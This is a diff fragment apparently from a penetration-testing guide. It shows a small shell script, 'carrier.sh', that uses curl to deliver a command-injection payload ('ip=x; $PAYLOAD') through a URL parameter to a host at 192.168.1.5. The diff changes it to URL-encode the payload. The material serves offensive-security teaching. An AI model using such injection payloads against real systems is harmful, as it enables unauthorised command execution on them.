@@ -44,7 +44,7 @@ Alternatively, we can use a script to carry the payload
 ```sh
 #!/bin/sh
 # carrier.sh
-curl "http://192.168.1.5/?ip=x; $0"
+curl http://192.168.1.5/ -G --data-urlencode "?ip=x; $PAYLOAD"
 ```
 
 ### Command Execution vis PSExec
